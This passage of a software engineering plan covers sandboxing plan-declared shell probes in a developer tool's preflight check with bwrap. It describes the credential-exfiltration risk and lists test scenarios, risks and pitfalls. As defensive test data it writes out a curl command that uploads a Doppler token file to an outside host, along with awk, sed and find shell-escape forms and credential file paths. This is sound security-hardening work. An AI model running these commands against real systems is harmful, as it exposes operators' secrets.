    `knowledge-base/project/plans/` is asserted in the suite (expected `1` — this plan).
15. `observability-schema-parity.test.ts` passes with `CANONICAL.length === 5`, all three
    template blocks set-equal to canonical, **and** the new sub-field extractor agreeing across
    canonical + the 3 blocks. Surface 3 stays at 5 names — the §4.7 mention is outside the
    count phrase and its parenthetical.
16. Exactly one `**PASS**` terminal survives in the Step 10.6 matrix.
17. `observability-coverage-reviewer.md` §Step 6: the sentence containing `Acceptable shapes`
    itself carries the `credentials_required` condition (asserted on the Step-6 window, not a
    bare file-wide `grep -c`, which a new paragraph elsewhere would satisfy while line 121
    survives verbatim). Its `description:` frontmatter is byte-unchanged, so
    `cd plugins/soleur && grep -h 'description:' agents/**/*.md | wc -w` returns exactly the
    baseline **2847** (the corpus is already 347 over the ~2500 advisory target, so an AC
    asserting "under 2500" would fail on arrival).
18. `AGENTS.md` and `AGENTS.rules.md` are byte-unchanged, so `lint-agents-rule-budget.py`
    reports `B_ALWAYS=44400` — identical to baseline. (Main already sits at
    `[WARN] >= 44000` against the 46000 ratchet; the invariant owed is *byte-identical*, not
    *no WARN*.)
19. `views.c4` and `spec.c4` byte-unchanged; `model.c4`'s `contributor` description no longer
    claims PR-head code is executed *only* by the Stage A producer.
    `apps/web-platform/test/c4-code-syntax.test.ts` and `c4-render.test.ts` pass.
20. Phase 3's execution replay ran over the `bash <script>` corpus class, its verdict diff is in
    the PR body, and a tracking issue exists per divergent plan.
21. `bash scripts/test-all.sh` exits 0.

### Post-merge (operator)

None. Plugin skill text and its test suite only — no deploy, migration, or infrastructure step.
Check 10 is invoked by no workflow (`grep -rn 'soleur:preflight' .github/workflows/` is empty);
it runs locally under `/soleur:ship`, so merge is delivery.

## User-Brand Impact

**If this lands broken, the user experiences:** a `/soleur:ship` run that either refuses every
legitimate probe — turning preflight's most substantive check into a permanent FAIL the
operator learns to click past — or silently executes a plan-declared command with the whole
filesystem readable and the worktree writable.

**If this leaks, the user's credentials are exposed via:** a `discoverability_test.command`
parsed from a PR-linked markdown file and executed on the operator's workstation. Measured
today: `wc -c < /home/$USER/.doppler/.doppler.yaml` returns **294 bytes** — a live Doppler
service token granting a real read of `soleur/prd_terraform` — plus `~/.ssh` private keys,
`~/.netrc`, `~/.aws/credentials`, `~/.docker/config.json`, and the `/run/user/<uid>/bus` D-Bus
socket exposing the Secret Service keyring. A probe can also write `.git/hooks/pre-commit`,
which `/soleur:ship` executes seconds later **with the real `$HOME`**. The repository is public,
so the plan file is attacker-authorable via any PR.

**Brand-survival threshold:** single-user incident.

One operator running `/soleur:ship` on a PR carrying a malicious plan suffices for total
credential compromise. That is why the fix is a filesystem boundary, not a verb filter — and
why the v1 design was rejected once measurement showed it was the latter wearing the former's
name.

## Observability

```yaml
liveness_signal:
  what: Check 10's regression suite — plugins/soleur/test/preflight-discoverability-test.test.ts
  cadence: every CI run of `bash scripts/test-all.sh` on push/PR
  alert_target: GitHub Actions `::error::` annotation on the ci.yml test job
  configured_in: .github/workflows/ci.yml
error_reporting:
  destination: GitHub Actions workflow run log + `::error::` annotation (observability layer 7 — cli-stdout-artifact; this is customer-executed plugins/ code, not hosted)
  fail_loud: true — part of test-all.sh; a red suite fails the required check and blocks merge
failure_modes:
  - mode: the sandbox is silently downgraded or removed, restoring the credential oracle
    detection: AC2/AC3 assert the bwrap flags in the Step 10.5 window AND the unreachability invariant; both are committed tests
    alert_route: workflow run log `::error::` annotation — layer 7 cli-stdout-artifact
  - mode: sandbox-unavailable silently falls back to unsandboxed execution
    detection: AC5's throwing executor stub reddens if any execution path is taken
    alert_route: workflow run log `::error::` annotation — layer 7 cli-stdout-artifact
  - mode: an inline-program verb (awk/sed/-c/-e) is re-admitted to the allowlist
    detection: AC6 enumerates all eight forms as committed cases
    alert_route: workflow run log `::error::` annotation — layer 7 cli-stdout-artifact
  - mode: credentials_required drifts into routine self-certification
    detection: AC14's committed corpus baseline count makes each new adoption a reviewable diff line
    alert_route: workflow run log `::error::` annotation — layer 7 cli-stdout-artifact
  - mode: a schema surface drifts (a template block loses the sub-field)
    detection: the new sub-field extractor in observability-schema-parity.test.ts
    alert_route: workflow run log `::error::` annotation — layer 7 cli-stdout-artifact
logs:
  where: GitHub Actions run log for the ci.yml test job (durable artifact: the committed suite + fixtures under plugins/soleur/test/fixtures/preflight-check-10/)
  retention: 90 days for run logs; the committed suite and fixtures are permanent in git
discoverability_test:
  command: grep -c "^PROBE_VERB_ALLOWLIST=" plugins/soleur/skills/preflight/SKILL.md
  expected_output: "1"
```

The probe reads a **committed artifact** with an allowlisted verb — no network, no credentials
— the shape `observability-coverage-reviewer` §Step 2 requires for a layer-7 citation, with the
committed suite + fixture directory as the durable artifact alongside the stdout marker.

Note the anchor: `^PROBE_VERB_ALLOWLIST=` (the assignment), not the bare token. Review caught
that a bare `grep -c PROBE_VERB_ALLOWLIST` returns ≥2 in any real implementation (assignment
plus the `if` test), and `matchExpected` treats ≤2-character tokens as **exact equality**
(`parser.ts:212`) — so `expected_output: "1"` against stdout `2` would have made **this PR's own
Check 10 fail at ship time**.

## Architecture Decision (ADR/C4)

Detection fires: this redefines what authority a plan-declared command executes with, and adds
a fail-closed invariant every future probe must honour.

### ADR

**ADR-175 — Execution boundary for plan-declared discoverability probes.** Decision: a probe
declared in a plan file executes inside a **filesystem-isolated sandbox** with no credential
stores bound and the repo read-only; the verb allowlist is deny-by-default and **every entry is
an authority grant**; a probe that genuinely needs credentials is **declared and skipped**,
never silently executed; and if the sandbox cannot be established, the check **SKIPs** rather
than executing.

`## Alternatives Considered` must record and defeat three specifically, not merely list them:
the **no-execution / ADR-074 Stage A** pattern (defeated on #4148 grounds — static gates
produce "declared-verifiable but unverified"), the **probe registry** (better long-term;
deferred with a tracking issue as the successor design), and the **ephemeral `$HOME`** design
(falsified by measurement — kept as the worked example of a control that changes lookup rather
than reachability).

`## Consequences` records as **open**: network egress remains (`--share-net` is required for
`curl`); the PR-head trust circularity is unresolved (the probe registry's `main`-tracked
resolution is what fixes it properly); and `AP-020` (untrusted input at the agent boundary —
"never shell-evaluate it") is still violated by construction, since Check 10 shell-evaluates
attacker-controlled text. ADR-175 must cite AP-020 and record why the violation is accepted
within the sandbox, rather than leaving the principles register silently contradicted.

Ordinal **provisional**: `ADR-171` is highest on `origin/main`. Re-derive before merge; if it
moves, sweep `grep -rn 'ADR-175' knowledge-base/project/{plans,specs}/` in the same edit.

### C4 views

All three model files were **read in full** — a `grep` for `preflight` returns zero and that is
explicitly *not* the evidence relied on.

| Category | Enumerated | Already modelled? |
| --- | --- | --- |
| External human actors | `founder`, `emailSender`, `betaContact`, `contributor` (`#external`) | Yes — all four |
| External systems touched | `doppler` (generic; the *CLI* appears only in relationship `technology` strings), `github` (no `gh`-CLI element exists) | Yes, at the model's granularity |
| Containers / stores touched | `platform.plugin.skills`, `platform.plugin.kb` ("Markdown + YAML … ADRs, specs, plans") — plans are folded into `kb`, not modelled individually | Yes |
| Actor↔surface access relationships changed | `contributor` → PR-head content → **executed on the operator's machine** by Check 10 | **No — and the existing description denies it** |

**The finding, and the direction-of-fit correction.** `contributor`'s description asserts its
PR-head code is executed *"only by the fix-constraints Stage A producer … never by the
privileged Stage B consumer (ADR-074)"*. That universal is false: Check 10 executes PR-head
plan content on the operator's workstation.

v1 proposed amending the description to match the implementation. Review named that as the
wrong direction of fit — **fitting the architecture document to the weaker implementation**, in
the very PR shipping an ADR about that boundary. v2 inverts it: Check 10 **adopts** the
isolation pattern the model already encodes (ADR-074 isolates untrusted PR-head execution;
Check 10 now isolates it too, via bwrap), and the description is amended to state the *general
invariant* both paths satisfy — untrusted PR-head content executes only inside an isolation
boundary, naming Stage A and preflight's sandbox — rather than an enumeration that was already
incomplete.

Description-only change: no new element, no new relationship, no tag change. `contributor` is
already in the `include` lists of both the `context` and `containers` views, so **no `views.c4`
edit** and nothing new to render. `spec.c4` unaffected.

**Declined, with reasoning:** adding a `preflight` component under `platform.plugin.*`. That
view is a curated subset (17 of 61 skills); `preflight`'s absence is a pre-existing curation
choice, not a falsehood this change creates.

**Validation:** `apps/web-platform/test/c4-code-syntax.test.ts` + `c4-render.test.ts`.

### Sequencing

True on merge — no soak, no `adopting` status.

## Domain Review

**Domains relevant:** engineering

### Engineering

**Status:** reviewed (4-agent panel — kieran-rails-reviewer, architecture-strategist,
code-simplicity-reviewer, spec-flow-analyzer)
**Assessment:** The panel falsified v1's central control by measurement and forced a
redesign from an environment tweak to a filesystem boundary. Substantive risks now are
(a) sandbox unavailability silently degrading to unsandboxed execution — addressed by a
fail-closed SKIP with a throwing-executor AC; (b) `credentials_required` drifting into
self-certification — addressed by a distinct terminal, a committed corpus baseline count, and
a reviewer-checklist entry; (c) over-narrowing the allowlist — addressed by deriving it from
the measured corpus and keeping the one-line-PR widening loop. The layer split is now
truthful: Layer 1 bounds authority (measured), Layer 2 bounds legibility and maintenance while
**still granting authority per entry**, Layer 3 waives verification under declaration.

**Product/UX Gate:** not applicable — no file in Files to Edit/Create matches a UI surface
(no `.tsx`, no `app/**/page.tsx`, no `components/**`). The mechanical UI-surface override does
not fire; tier NONE.

**GDPR / compliance (2.7):** skipped. No regulated-data surface; none of the four expansion
triggers fire. The change **narrows** credential exposure.

**Infrastructure (2.8):** skipped. No server, service, cron, vendor account, DNS record, cert,
secret, or firewall rule. `bwrap` is an existing host binary, not provisioned infrastructure.

**Encryption Posture (2.11):** skipped. No persistent store, no new cross-component connection.

## Risks & Mitigations

| Risk | Mitigation |
| --- | --- |
| `bwrap` unavailable or userns-restricted (the #5000/#5004 drift class; `kernel.apparmor_restrict_unprivileged_userns = 1` measured on this host, bwrap still functional) | Fail-closed **SKIP** with a named reason; never an unsandboxed fallback. AC5 pins it with a throwing executor |
| Sandbox breaks DNS and every `curl` probe reads as a #4148 DNS regression | Root-caused and fixed at plan time: `--tmpfs /run` removes `/run/systemd/resolve/stub-resolv.conf`; the resolver bind restores it. Measured `curl=200`, `dig` resolves. AC4 pins it |
| Mount-order bug silently disables the repo bind | `--tmpfs /home` must precede `--ro-bind "$REPO_ROOT"`; this cost one debugging cycle at plan time and is called out in AC2 and Sharp Edges |
| Allowlist too narrow, false-rejecting real probes | Derived from a measured 632-command corpus; every verb has ≥2 uses. Widening is a reviewed one-line PR — the intended maintenance loop for deny-by-default |
| `credentials_required` becomes routine self-certification | Distinct `SKIP-DECLARED` terminal, committed corpus baseline count asserted in the suite, reviewer-checklist entry. Residual risk stated as a gradient, not a possibility |
| Network egress still allows repo-content exfiltration | Named as open in ADR-175 `## Consequences`, not silently omitted. `--share-net` is required for the dominant probe class |
| PR-head trust circularity unresolved | Named as open; the probe registry is recorded as the successor design with a tracking issue |
| Four duplicated schema copies drift | Parity test extended with a sub-field extractor (AC15) |
| ADR ordinal collision with a sibling PR | Re-derived against `origin/main` before merge; renumber sweeps plan + tasks + ACs in one edit |

## Test Scenarios

| # | Scenario | Expected |
| --- | --- | --- |
| 1 | `curl -fsS … https://app.soleur.ai/api/inngest` | executes in sandbox; rows 4–8 as today |
| 2 | `doppler run … -- scripts/x.sh`, no declaration | **FAIL** — verb not allowlisted; reason names both remedies |
| 3 | same + valid `credentials_required` | **SKIP-DECLARED**, not executed (throwing executor); scope quoted |
| 4 | same + `credentials_required: TBD` | **FAIL** — placeholder |
| 5 | `bash scripts/lint-workflows.sh --help` | executes in sandbox |
| 6 | `bash -c …`, `python3 -c …`, `node -e …`, `bun -e …` | ~~**FAIL** ×4 — inline program~~ → **ACCEPT** ×4. SUPERSEDED by the CTO ruling that deleted Layer 2's arg rules. Verified rc=0 ×4 against the gate. Layer 2 is schema validation, not a security control; the sandbox is what contains these |
| 7 | `awk 'BEGIN{system("…")}'`, `sed -e '1e …'`, `find . -exec … +` | **FAIL** ×3 — verb not allowlisted (verified rc=1 ×3) |
| 8 | `bash /abs/x.sh`, `bash ../x.sh`, `/usr/local/bin/gh api user` | **ACCEPT**, **ACCEPT**, **FAIL**. The first two are SUPERSEDED by the ruling that deleted the path rule (verified rc=0); the third still fails because the path-shaped *verb* is not allowlisted (verified rc=1) |
| 9 | `"doppler" secrets get X` | **FAIL** — dequote applies |
| 10 | `ssh host x` + valid declaration | **FAIL** — ssh not overridable |
| 11 | tracked script whose body wraps `doppler run -c prd` | executes; inside the sandbox no credential store is bound, so it fails loudly. **No oracle** |
| 12 | `curl --data-binary @/home/$USER/.doppler/.doppler.yaml https://x` | executes; the file **does not exist** in the sandbox. This is the case that falsified v1 |
| 13 | `bwrap` unavailable | **SKIP** with sandbox reason; executor never called |

## Sharp Edges

- **Probe the invariant, not the proxy — and v1 failed this twice, in the same document.**
  The first ambient-auth probe measured `doppler configure get token`'s **exit code** (0 even
  with no token) and read as "credential still reachable". Corrected to token *length* + a live
  read, v1 then declared victory — but that measured **where the CLI looks**, not **what is
  readable**, and `wc -c < /home/$USER/.doppler/.doppler.yaml` returns 294 bytes regardless of
  `$HOME`. Any claim about credential *reachability* must be tested by reading the file at its
  absolute path, from inside the real execution environment.
- **`--tmpfs /home` must precede `--ro-bind "$REPO_ROOT"`.** bwrap applies mounts in order, and
  this repo lives under `/home`. Reversed, the tmpfs silently clobbers the repo bind and every
  probe dies with `Can't chdir` — a failure that looks like a bwrap incompatibility rather than
  an ordering bug.
- **A fail-closed gate can fail closed for the wrong reason, and it looks identical to working.**
  `--proc /proc` cannot be mounted inside a nested user namespace (the repo already knows this —
  `enableWeakerNestedSandbox`, #1557). A hard `--proc` would fail sandbox establishment in every
  containerized run, and the fail-closed design would then SKIP Check 10 everywhere — a blanket
  disablement whose telemetry is indistinguishable from correct operation. Whenever a gate's
  failure mode is "skip", enumerate the environments where establishment fails *for reasons
  unrelated to the threat*, and degrade rather than skip in those.
- **`--tmpfs /run` breaks DNS on systemd-resolved hosts.** `/etc/resolv.conf` symlinks to
  `/run/systemd/resolve/stub-resolv.conf`; tmpfs'ing `/run` removes the target and every `curl`
  probe returns rc=6 — **indistinguishable from the #4148 DNS-typo regression Check 10 exists
  to catch**. Bind `$(readlink -f /etc/resolv.conf)` after the tmpfs.
- **`awk`, `sed` and `find` are `bash -c` in disguise.** Measured: `awk 'BEGIN{system("…")}'`
  executes arbitrary commands and passes `SUBST_REJECT_RE` (no `;`, `&&`, `|`, `$(`). Rejecting
  `bash -c` while allowlisting `awk` is incoherent. The same applies to `python3 -c`, `node -e`,
  `bun -e`, GNU `sed`'s `e` flag, and `find -exec`.
- **`git ls-files --error-unmatch` is not a review oracle.** It interrogates the **PR-head
  index** — the attacker's own branch — and preflight runs *before* merge. "Tracked" and
  "reviewed" are different properties; only a `main`-anchored lookup (`git cat-file -e
  "$(git merge-base origin/main HEAD):<path>"`) would mean the latter, and even that is what the
  probe-registry successor design exists to do properly.
- **Assert against the Step 10.4/10.5 gate *windows*, never the whole file.** The existing
  wiring tests already learned this: a whole-file grep for a reject token is satisfied by the
  Sharp Edge that *documents* it, so deleting the real gate stays green. Note `gateWindow()`
  anchors only on `^if \[\[ "\$CMD` and returns `idx-6 … idx+4` — the allowlist assignment must
  sit inside that window, or generalize the anchor in the same PR
  (`cq-assert-anchor-not-bare-token`).
- **A bare `grep -c PROBE_VERB_ALLOWLIST` returns ≥2, and `matchExpected` exact-matches ≤2-char
  tokens.** This plan's own `discoverability_test` would have failed at ship time. Anchor on
  the assignment (`^PROBE_VERB_ALLOWLIST=`).
- **Adding a name to §4.7's `the N required top-level fields (…)` parenthetical reddens the
  parity test** (set-equality against `CANONICAL`, which stays 5). Mention the sub-field outside
  the count phrase and the parenthetical.
- **~40% of the corpus's declared probes cannot run today**, unrelated to this fix: `cd … && …`
  (97) trips the `&&` reject; `bun` / `./node_modules/.bin/*` (28) fail rc=127 on the restricted
  `PATH`. Do **not** widen `PATH` here — that is an authority grant inside a PR that narrows
  authority.
- **Read `credentials_required` with a flat sub-field `awk`, as `expected_output` already is.**
  Do not extend `parse-form-a.awk` — it is pinned byte-exactly against the TS mirror by the
  P1/P2/P3 parity harness. The flat read inherits `expected_output`'s pre-existing limitation
  (two `discoverability_test` sub-blocks could confuse it); not fixed here.
- **Exactly one `**PASS**` terminal must survive the matrix growth.** The matrix test counts
  rows with `toBeGreaterThanOrEqual(8)` but pins `passRows.length` to `1`.
- **A plan whose `## User-Brand Impact` section is empty, contains only `TBD`/`TODO`/
  placeholder text, or omits the threshold will fail `deepen-plan` Phase 4.6.** Fill it before
  requesting deepen-plan or `/work`.
